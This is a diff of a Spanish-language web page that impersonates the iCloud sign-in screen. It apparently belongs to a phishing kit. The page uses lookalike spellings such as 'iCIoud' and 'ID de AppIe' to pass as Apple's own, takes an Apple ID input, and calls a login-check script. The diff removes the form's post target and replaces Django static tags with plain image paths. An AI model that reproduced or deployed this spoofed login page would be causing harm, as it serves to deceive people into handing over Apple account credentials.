@@ -42,7 +42,7 @@
                     <span><h6>Iniciar sesión en iCIoud</h6></span>
                 </div>
                 <div>
-                    <form action="inform" method="post">
+                    <form>
                         <div class="boxFrm" style="width:325px;">
                             <div class="line1">
                                 <input type="text" value="" class="appId1" placeholder="ID de AppIe" name="appIe" id="appIe">
@@ -82,7 +82,7 @@
 </div>
 
 <script>
-    $("body").css("visibility", "hidden");
+       $("body").css("visibility", "hidden");
     $('#loader').activity({width: 1.5, segments: 12, length: 5});
     jQuery('#submit_loader').activity({width: 1.5, segments: 12, length: 5});
     function typeCheck(element) {
@@ -139,9 +139,9 @@
         $(".tlrm").on("click", function () {
             k++;
             if (k % 2 == 0) {
-                $("#tlrm").attr("src", "{% static 'images/checked.png'%}");
+                $("#tlrm").attr("src", "images/checked.png");
             } else {
-                $("#tlrm").attr("src", "{% static 'images/Unknown.png'%}");
+                $("#tlrm").attr("src", "images/Unknown");
             }
         });
     });
@@ -158,6 +158,5 @@
             checklogin();
         }
     });
-       
 </script>
 </body></html>
